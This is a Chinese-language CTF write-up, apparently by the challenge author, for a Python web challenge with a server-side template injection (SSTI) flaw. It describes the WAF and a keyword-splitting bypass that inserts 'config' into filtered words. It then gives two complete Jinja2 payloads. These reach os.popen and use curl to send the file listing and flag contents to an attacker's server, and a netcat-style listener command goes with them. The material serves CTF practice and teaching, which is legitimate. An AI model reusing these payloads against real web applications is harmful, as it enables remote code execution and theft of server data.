# 你的名字
输入数据有回显，看返回头是python写的后台，猜测有SSTI（加了个php模式的报错和index.php路由不知道有没有骗到某个师傅--）
然后接下来是绕WAF，我写了两个过滤，一个强过滤是匹配`{{`和`}}`，目的是想让各位师傅用远程SSTI把flag打到自己服务器上。

然后是一个简单的单词匹配过滤os等敏感字符，只要FUZZ一下，再实验一下，会找到config这个大多数poc都用不上且过滤排在较后，可以用来绕过过滤。

服务器监听
`nv -lvp port
`

根目录查flag：
`{% iconfigf ''.__claconfigss__.__mconfigro__[2].__subclasconfigses__()[59].__init__.func_glconfigobals.linecconfigache.oconfigs.popconfigen('curl http://yourip:port/ -d `ls / | grep flag`;') %}1{% endiconfigf %}`
读flag：
`{% iconfigf ''.__claconfigss__.__mconfigro__[2].__subclasconfigses__()[59].__init__.func_glconfigobals.linecconfigache.oconfigs.popconfigen('curl http://yourip:port/ -d `cat /flag_1s_Hera`;') %}1{% endiconfigf %}`


